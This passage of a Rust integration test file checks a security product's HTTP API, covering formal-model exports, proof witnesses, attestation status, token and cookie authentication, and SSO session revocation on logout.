    let (port, token) = spawn_test_server();
    let err = ureq::get(&format!("{}/api/nonexistent", base(port)))
        .set("Authorization", &auth_header(&token))
        .call();
    match err {
        Err(ureq::Error::Status(404, _)) => {}
        other => panic!("expected 404, got {other:?}"),
    }
}

// ── GET /api/export/tla ────────────────────────────────────────

#[test]
fn export_tla_returns_valid_module() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/export/tla", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("export tla request");
    assert_eq!(resp.status(), 200);

    let body = resp.into_string().unwrap();
    assert!(body.contains("MODULE PolicyStateMachine"));
    assert!(body.contains("LegalTransition"));
    assert!(body.contains("NoSkipDeescalation"));
    assert!(body.contains("===="));
}

// ── GET /api/export/alloy ──────────────────────────────────────

#[test]
fn export_alloy_returns_valid_module() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/export/alloy", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("export alloy request");
    assert_eq!(resp.status(), 200);

    let body = resp.into_string().unwrap();
    assert!(body.contains("module PolicyStateMachine"));
    assert!(body.contains("legalTransition"));
    assert!(body.contains("noSkipDeescalation"));
    assert!(body.contains("check noSkipDeescalation"));
}

// ── GET /api/export/witnesses ──────────────────────────────────

#[test]
fn export_witnesses_returns_empty_array_initially() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/export/witnesses", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("export witnesses request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.as_array().unwrap().is_empty());
}

#[test]
fn export_witnesses_populated_after_run_demo() {
    let (port, token) = spawn_test_server();

    // Run demo to populate proof registry
    let _resp = ureq::post(&format!("{}/api/control/run-demo", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("run-demo request");

    // Now fetch witnesses
    let resp = ureq::get(&format!("{}/api/export/witnesses", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("export witnesses after demo");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    let witnesses = body.as_array().unwrap();
    assert!(!witnesses.is_empty());
    assert_eq!(witnesses[0]["backend"], "sha256-digest");
    assert_eq!(witnesses[0]["label"], "baseline_update");
    assert!(witnesses[0]["verified"].as_bool().unwrap());
}

// ── GET /api/research-tracks ───────────────────────────────────

#[test]
fn research_tracks_returns_grouped_tracks() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/research-tracks", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("research-tracks request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    let groups = body.as_array().expect("should be array");
    assert!(groups.len() >= 7, "at least 7 track groups");

    let first = &groups[0];
    assert!(first.get("label").is_some());
    let tracks = first["tracks"].as_array().expect("tracks array");
    assert!(!tracks.is_empty());

    let t = &tracks[0];
    assert!(t.get("code").is_some());
    assert!(t.get("title").is_some());
    assert!(t.get("status").is_some());
    assert!(t.get("summary").is_some());
}

// ── GET /api/attestation/status ────────────────────────────────

#[test]
fn attestation_status_returns_verification_result() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/attestation/status", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("attestation status request");
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.into_json().unwrap();
    assert!(body.get("passed").is_some());
    assert!(body.get("checks").is_some());
    let checks = body["checks"].as_array().unwrap();
    assert!(!checks.is_empty());
}

// ── GET /api/auth/check ────────────────────────────────────────

#[test]
fn auth_check_without_token_returns_401() {
    let (port, _token) = spawn_test_server();
    let err = ureq::get(&format!("{}/api/auth/check", base(port))).call();
    match err {
        Err(ureq::Error::Status(401, _)) => {}
        other => panic!("expected 401, got {other:?}"),
    }
}

#[test]
fn auth_check_with_valid_token_returns_ok() {
    let (port, token) = spawn_test_server();
    let resp = ureq::get(&format!("{}/api/auth/check", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("auth check");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["status"], "ok");
}

#[test]
fn auth_session_exchange_sets_cookie_and_accepts_cookie_session() {
    let (port, token) = spawn_test_server();
    let resp = ureq::post(&format!("{}/api/auth/session", base(port)))
        .set("Authorization", &auth_header(&token))
        .call()
        .expect("session exchange");
    assert_eq!(resp.status(), 200);
    let cookie = resp
        .header("Set-Cookie")
        .expect("session exchange should set a cookie")
        .split(';')
        .next()
        .unwrap()
        .to_string();
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["authenticated"], true);
    assert_eq!(body["role"], "admin");
    assert_eq!(body["cookie"]["http_only"], true);
    assert_eq!(body["cookie"]["same_site"], "Strict");

    let session = ureq::get(&format!("{}/api/auth/session", base(port)))
        .set("Cookie", &cookie)
        .call()
        .expect("cookie-backed auth session");
    let session_body: serde_json::Value = session.into_json().unwrap();
    assert_eq!(session_body["authenticated"], true);
    assert_eq!(session_body["source"], "session");
    assert_eq!(session_body["role"], "admin");
}

#[test]
fn auth_session_accepts_sso_session_token_and_logout_revokes_it() {
    let (port, _token) = spawn_test_server();
    let session_path = test_state_path(port, "sessions.json");
    let key_path = test_state_root(port).join(".wardex_session_key");
    let seal_key = std::fs::read_to_string(&key_path)
        .ok()
        .map(|s| s.trim().as_bytes().to_vec());
    let store = SessionStore::with_persistence_key(&session_path, seal_key);
    let session_id = store.create_session(
        "sso-user",
        "sso@example.com",
        "analyst",
        &["soc-analysts".to_string()],
        8,
    );

    let resp = ureq::get(&format!("{}/api/auth/session", base(port)))
        .set("Authorization", &auth_header(&session_id))
        .call()
        .expect("auth session with SSO token");
    assert_eq!(resp.status(), 200);
    let body: serde_json::Value = resp.into_json().unwrap();
    assert_eq!(body["authenticated"], true);
    assert_eq!(body["role"], "analyst");
    assert_eq!(body["user_id"], "sso-user");
    assert_eq!(body["source"], "session");
    assert_eq!(body["groups"], serde_json::json!(["soc-analysts"]));

    let logout = ureq::post(&format!("{}/api/auth/logout", base(port)))
        .set("Authorization", &auth_header(&session_id))
        .call()
        .expect("logout SSO session");
    assert_eq!(logout.status(), 200);
    let logout_body: serde_json::Value = logout.into_json().unwrap();
    assert_eq!(logout_body["logged_out"], true);
    assert_eq!(logout_body["session_revoked"], true);

    match ureq::get(&format!("{}/api/auth/session", base(port)))
        .set("Authorization", &auth_header(&session_id))
        .call()
    {
        Err(ureq::Error::Status(401, _)) => {}
        other => panic!("expected 401 after SSO logout, got {other:?}"),
    }
}
